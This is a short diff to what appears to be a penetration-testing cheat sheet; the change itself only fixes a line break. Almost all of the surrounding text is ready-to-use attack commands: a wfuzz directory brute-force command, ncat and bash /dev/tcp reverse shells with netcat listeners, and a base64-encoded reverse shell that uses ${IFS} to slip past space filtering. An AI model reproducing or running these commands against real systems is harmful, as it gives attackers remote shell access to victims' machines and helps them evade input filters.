@@ -49,7 +49,8 @@ wfuzz -c -z file,/root/SecLists/Discovery/Web-Content/common.txt --hc 404,400 -X
 
 Victim: ncat -e /bin/bash {IP} {PORT}<br>
 Attacker: Machine:nc -lvnp {PORT}<br>
-python -m SimpleHTTPServer 9999Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>
+python -m SimpleHTTPServer 9999<br>
+Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>
 
 Attacker: Machine:nc -lvnp {PORT}<br>
 Victim(Base64): echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;<br>
